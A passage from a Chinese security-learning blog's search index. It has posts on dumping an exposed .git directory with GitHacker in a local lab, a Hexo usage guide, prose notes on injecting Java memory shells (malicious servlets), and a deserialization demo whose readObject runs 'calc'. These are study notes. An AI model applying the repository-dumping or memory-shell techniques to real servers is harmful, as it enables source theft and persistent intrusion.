href="https://github.com/WangYihang/GitHacker">GitHacker</a></p><p>这里书里没有过多赘述，并且描述并不详细，不过还是要自己复现一下，以加深印象</p><p>【环境复现】：使用<code>git branch</code> 可以查看分支，此时只有master</p><p>使用 <code>git branch dev</code>创建一个名为dev的分支（<strong>名字随意</strong>）</p><p>再次查看分支，此时有两个分支：master和dev，此时master有<strong>*标并且颜色为绿色</strong>代表此时处在master分支，如下图：</p><p><img src="image-20230128210339890.png" alt="image-20230128210339890"></p><p>使用<code>git checkout dev</code>命令可以切换到dev分支</p><p>此时修改flag.php的内容为flag{new flag is here}</p><p><img src="image-20230128210907463.png" alt="image-20230128210907463"></p><p>git二连（加入暂存区，提交）如下图：</p><p><img src="image-20230128211151702.png" alt="image-20230128211151702"></p><p>使用<code>git checkout master</code>回到master页面。发现flag.php的内容仍为原来的，环境搭建完成！</p><p><img src="image-20230128213658558.png" alt="image-20230128213658558"></p><p>接下来进行复现漏洞：</p><p>首先安装工具<code>python3 -m pip install -i https://pypi.org/simple/ GitHacker</code></p><p><img src="image-20230128213221099.png" alt="image-20230128213221099"></p><p>安装成功后便可以直接使用githacker命令了 <code>githacker --url http://127.0.0.1/git_test/.git --output-folder result</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://127.0.0.1/git_test/.git --output-folder result</span><br><span class="line">//--url 后面跟url与scrabble不同的是，git hacker需要将.git路径加上</span><br><span class="line">//--output-folder xxx 表示结果将要输出到result文件夹中</span><br></pre></td></tr></table></figure><p><img src="image-20230128214149062.png" alt="image-20230128214149062"></p><p>执行命令后，在目录里生成了一个result文件夹，进入最里面的路径发现有一个flag.php打开发现内容为</p><p><img src="image-20230128214350931.png" alt="image-20230128214350931"></p><p>内容正是master分支下的flag.php的内容，使用<code>git reflog</code>看到是从tmp文件中clone出来的</p><p><img src="image-20230128215450007.png" alt="image-20230128215450007"></p><p>我们找到那个临时文件夹 使用<code>git reflog</code>命令可以看到所有的checkout信息</p><p><img src="image-20230128215605655.png" alt="image-20230128215605655"></p><p>之后就可以切换到dev分支找到flag</p>]]></content>
      
      
      <categories>
          
          <category> 从0到1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo使用指南</title>
      <link href="/2022/12/17/hexo%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2022/12/17/hexo%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>1.在本地创建文章</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;文章标题&quot;</span><br></pre></td></tr></table></figure><p>2.生成发布</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo g #生成页面</span><br><span class="line"></span><br><span class="line">hexo d #部署发布</span><br></pre></td></tr></table></figure><p>3.预览页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s #在本地生成预览页面</span><br></pre></td></tr></table></figure><p>4.在source目录下，执行下面命令，建立标签页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;tags&quot; </span><br></pre></td></tr></table></figure><p>5.在hexo文章中插入图片</p><p>在<code>config.yaml</code>文件中更改一下配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>此时创建文章会生成新的同名文件夹，但引用却很麻烦</p><p>因此要使用插件<a href="https://link.zhihu.com/?target=https%3A//github.com/hexojs/hexo-renderer-marked">hexo-renderer-marked</a></p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-marked</span><br></pre></td></tr></table></figure><p>进行安装，之后</p><p>在<code>config.yaml</code>文件中更改一下配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">marked:</span></span><br><span class="line">  <span class="attr">prependRoot:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">postAsset:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>在typora中系修改如下配置（文件—-偏好设置）</p><p><img src="1.png" alt="1"></p><p>这样无论是插入的本地图片还是网络图片都会变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](文章名/图片)</span><br></pre></td></tr></table></figure><p>的样式</p><p>解决！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 使用指南 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2漏洞复现</title>
      <link href="/2022/06/21/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/06/21/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内存马学习</title>
      <link href="/2022/06/16/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/06/16/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h4><p>正常类的加载过程：(以Student类为例)</p><blockquote><p>1.当执行new Student()时，会触发JVM加载Student.class文件<br>2.JVM从本地磁盘找到Sudent.class文件并加载到JVM内存中<br>3.class文件加载后，JVM会自动创建一个class对象，一个类只能产生一个class对象</p></blockquote><p>Java反射的本质：</p><blockquote><p>在内存中得到class对象，反向获取Student对象的信息</p></blockquote><p>Java反射的步骤：</p><blockquote><ul><li>获取目标类型的Class对象</li><li>通过 Class 对象分别获取Constructor类对象、Method类对象 &amp; Field 类对象</li><li>通过 Constructor类对象、Method类对象 &amp; Field类对象分别获取类的构造函数、方法&amp;属性的具体信息，并进行后续操作</li></ul></blockquote><h4 id="Java-Instrumentation"><a href="#Java-Instrumentation" class="headerlink" title="Java Instrumentation"></a>Java Instrumentation</h4><blockquote><p>Instrumentation是Java提供的一个来自JVM的接口，该接口提供了一系列查看和操作Java类定义的方法，例如修改类的字节码、向classLoader的classpath下加入jar文件等，使得开发者可以通过Java语言来操作和监控JVM内部的一些状态，进而实现Java程序的监控分析，甚至实现一些特殊功能（如AOP、热部署）</p><p>Java agent 通过Instrumentation API与JVM交互</p></blockquote><p>在注入<a href="https://so.csdn.net/so/search?q=内存&amp;spm=1001.2101.3001.7020">内存</a>马的过程中，我们可以利用java Instrumentation机制，动态的修改已加载到内存中的类里的方法，进而注入恶意的代码</p><h4 id="内存马类型"><a href="#内存马类型" class="headerlink" title="内存马类型"></a>内存马类型</h4><ul><li>servlet-api类：filter型、servlet型、listener型</li><li>spring类：interceptor型、controller型</li><li>Java Instrumentation类：agent型</li></ul><h4 id="内存马简介"><a href="#内存马简介" class="headerlink" title="内存马简介"></a>内存马简介</h4><p><strong>目标</strong>：访问url或指定url，带上命令执行参数，即可让服务器返回执行结果</p><p><strong>实现</strong>：以java为例，客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的</p><h4 id="内存码原理与实现："><a href="#内存码原理与实现：" class="headerlink" title="内存码原理与实现："></a>内存码原理与实现：</h4><p>实现：</p><p>servlet型：创建一个恶意的servlet，获取当前的standardcontext，将恶意servlet封装成wapper添加到StandardContext的child中，添加servletMapping将访问的URL和wapper进行绑定</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA反序列化漏洞浅析</title>
      <link href="/2022/06/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/06/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="JAVA反序列化与ObjectInputStream"><a href="#JAVA反序列化与ObjectInputStream" class="headerlink" title="JAVA反序列化与ObjectInputStream"></a>JAVA反序列化与ObjectInputStream</h4><p>关于ObjectOutputStream：</p><blockquote><p>ObjectOutputStream:对象的<strong>序列化流</strong>，作用：把对象转成字节数据的输出到文件中保存，对象的输出过程称为<strong>序列化</strong>，可实现对象的持久存储。</p></blockquote><p>关于ObjectInputStream：</p><blockquote><p>ObjectInputStream <strong>反序列化流</strong>，将之前使用 ObjectOutputStream 序列化的原始数据恢复为对象，以流的方式读取对象。 </p></blockquote><p>在JAVA中，利用ObjectinputStream的readObject方法进行对象读取时，如果，目标对象已经重写了readObject方法，那么此时就会执行已经被重写的readObject如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个MyObj类，此时MyObj类需要继承Serializable才能进行序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObj</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> Exception, IOException &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">in.defaultReadObject();</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);<span class="comment">//执行calc命令</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main方法，将新的MyObj对象序列化后写入object文件，之后反序列化后再读取出来</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">MyObj o=<span class="keyword">new</span> <span class="title class_">MyObj</span>();</span><br><span class="line">o.setName(<span class="string">&quot;haha wocao&quot;</span>);</span><br><span class="line">FileOutputStream fos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">ObjectOutputStream os=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">os.writeObject(o);</span><br><span class="line">os.close();</span><br><span class="line">FileInputStream fis=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">MyObj o1=(MyObj) ois.readObject();</span><br><span class="line">System.out.println(o1.getName());</span><br><span class="line">ois.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击运行后，发现输出了“haha wocao”并执行了calc命令</p><p><img src="2022-06-15 154047.png" alt=""></p><p>可见在反序列化时，可能会给恶意代码提供可乘之机<br>如果反序列化执行的是恶意构造的字节序列，那么漏洞就产生了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro漏洞复现</title>
      <link href="/2022/06/14/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/06/14/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>游戏精彩时刻</title>
      <link href="/game/index.html"/>
      <url>/game/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于我</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>我的豆瓣</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
